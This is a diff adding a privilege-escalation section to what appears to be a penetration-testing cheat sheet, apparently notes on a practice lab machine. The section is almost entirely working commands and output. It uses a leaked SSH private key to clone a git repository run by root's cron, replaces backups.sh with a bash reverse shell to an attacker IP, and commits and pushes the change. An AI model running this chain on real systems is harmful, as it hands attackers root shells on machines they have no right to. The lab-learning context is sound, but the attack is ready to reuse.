@@ -2078,6 +2078,74 @@ sudo apt-get install libx11-dev:i386 libx11-dev
 gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
+### Crontab/Git
+````
+/var/spool/anacron:
+total 20
+drwxr-xr-x 2 root root 4096 Nov  6  2020 .
+drwxr-xr-x 6 root root 4096 Nov  6  2020 ..
+-rw------- 1 root root    9 Jan 23 10:34 cron.daily
+-rw------- 1 root root    9 May 28 02:19 cron.monthly
+-rw------- 1 root root    9 May 28 02:19 cron.weekly
+*/3 * * * * /root/git-server/backups.sh
+*/2 * * * * /root/pull.sh
+````
+````
+-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
+````
+#### Setup
+````
+GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.214.125:/git-server
+````
+````
+cd git-server
+cat backups.sh 
+#!/bin/bash
+#
+#
+# # Placeholder
+#
+
+````
+````
+cat backups.sh 
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.45.191/18030 0>&1
+````
+````
+GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git status            
+On branch master
+Your branch is up to date with 'origin/master'.
+
+Changes not staged for commit:
+  (use "git add <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        modified:   backups.sh
+
+no changes added to commit (use "git add" and/or "git commit -a")
+````
+#### Git setup / exploit
+````
+git config --global user.email "root@hunit"
+git config --global user.name "root"
+````
+````
+GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git add --all
+IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git commit -m "PE Commit"
+
+[master 872aa26] Commit message
+ 1 file changed, 1 insertion(+), 4 deletions(-)
+ 
+ GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git push origin master        
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 3 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 294 bytes | 147.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+To 192.168.214.125:/git-server
+   b50f4e5..872aa26  master -> master
+````
 ### Exiftool priv esc
 ````
 SHELL=/bin/sh
